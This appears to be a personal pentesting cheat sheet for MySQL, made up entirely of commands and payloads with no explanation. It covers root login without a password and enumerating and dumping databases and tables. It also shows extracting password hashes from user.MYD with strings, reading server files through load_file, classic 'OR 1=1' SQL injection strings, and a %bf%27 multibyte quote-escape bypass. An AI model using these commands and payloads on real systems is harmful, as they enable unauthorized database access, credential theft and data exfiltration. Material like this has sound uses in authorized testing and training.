```
mysql -u root
```

```
show databases;
use [DATABASE];
show tables;
select * from [TABLE];
```

```
mysql -u root -p password
```

```
find / -name mysql 2>/dev/null
```

```
strings /var/lib/mysql/mysql/user.MYD
```

```
select load_file('/var/lib/mysql-files/key.txt');
```

![[Pasted image 20230906083443.png]]

```
' 1 or 1=1 --'
```

```
' 1 or 1=1 #'
```

```
SELECT * FROM users WHERE username = 'input' LIMIT 1;
```

```
SELECT * FROM users WHERE username = '' OR 1=1; --' LIMIT 1;
```

```
%bf%27
```

```
%bf%27 or 1=1 --
```

